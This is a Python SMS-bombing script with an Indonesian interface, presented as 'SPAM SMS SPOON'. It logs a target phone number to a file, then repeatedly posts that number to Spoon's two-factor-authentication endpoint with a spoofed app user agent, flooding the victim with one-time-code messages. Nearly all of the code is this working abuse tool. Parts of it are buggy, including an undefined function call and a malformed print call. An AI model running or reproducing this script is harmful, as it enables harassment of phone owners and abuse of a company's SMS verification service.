#module
import requests
import style
import os
import sys
from time import sleep
from time import *
from datetime import datetime
import time, requests, random
#KETIK
def typing(s):
      for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.01)
#COLOR
merah ='\33[31;1m'
putih = '\33[37;1m'
merah ='\33[31;1m'
putih = '\33[37;1m'
putih = '\33[37;1m'
ijo ='\33[32;1m'
br ='\33[0;36m'
merah = '\33[31;1m'
kn = '\33[1;33m'
ungu = '\33[95m'
W = '\033[0m'
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
L = '\033[95m'
C = '\033[96m'
_W = '\033[1;97m'
_R = '\033[1;91m'
_G = '\033[1;92m'
_Y = '\033[1;93m'
_B = '\033[1;94m'
_L = '\033[1;95m'
_C = '\033[1;96m'


os.system('clear')
print(" ")
print('Hallo , Selamat datang...Nama kamu siapa?')
nama =input('ketik nama kamu disini !')
nama_asli=''
print(ijo+'')
if nama==nama_asli:
            typing('Hallo', nama,'!')
else:
            print('ishhhhh² intan payung ,kk ',nama, 'hallo!')
print(" ")
print(" ")
time.sleep(3)
baner0=("⟩»››››BERHASIL LOG IN‹‹‹‹«⟨")
print(ijo+baner0.center(70))
time.sleep(2)
os.system('clear')
typing(style.blue('Hello',style.light_black('world') + '!'))
typing(style.green('WELCOME',style.light_black('😊') + '!'))
baner1 = (' **********•*********')
baner  =('==SPAM SMS SPOON==')
print( putih+baner.center(60))
print (putih+baner1.center(60))
typing(merah+'NOTE:\n-•MASUKAN NO TUJUAN +62 [08+++] \n-•MAXIMAL 14 SPAM / NO TUJUAN [ 10 spam pertama + 4 spam terakhir ]\n-•GAGAL?..WAKTU DELAY 30 MENIT [ SETELAH PROSES SPAM ]')
print(putih+" ")
baner2 =('AUTHOR BY :BANGKEY')
print (baner1.center(60))
print(baner2.center(60))
time.sleep(2)
typing(merah+" ")
axis = open('nmraxis.txt','a+')
nmr = input('nomer :')
axis.write(nmr+'\n')
axis.close()
nmr = '62'+nmr[1:]
banyak=int(input('Masukan jumlah spam !='))
while banyak<=0:
    banyak=int(input('Masukan jumlah spam !'))
    
for i in range (banyak):
    headersz=headersz={'User-Agent':'Spoon/4.3.22(203) Dalvik/2.1.0 (Linux; U; Android 9; Redmi 4X Build/PQ2A.190305.002'}
    msi= {"msisdn": str(nmr)}
    aa = requests.post("https://id-api.spooncast.net/tfa/send/",headers=headersz,json=msi)
    #print(aa.status_code)
    #print(aa.json())
    status = (aa.status_code)
    hasil1 = 'Berhasil (✓)'
    hasil2 = 'Gagal (✖)'
    if status == 200:
            print(baner1.center(70))
            print(aa.json)
            print(kn+'-•Mengirim Ke no ' +nmr )
            print(ijo+hasil1.center(70," "))
    if status == 429:
            print(baner1.center(70))
            print(aa.json)
            print(kn+'-•Mengirim Ke no ' +nmr )
            print(merah+hasil2.center(70," "))
            time.sleep(3)
            typing("\n S E L E S A I \n")
            sleep(0.5)
            kembali = input('Keluar..? INPUT ›→( t ) or Next ..? INPUT ›→ ( y ) : ')
            if kembali == 'y':
                    os.system('clear')
                    list8()
            if kembali == 't':
                    os.system('clear')
                    exit()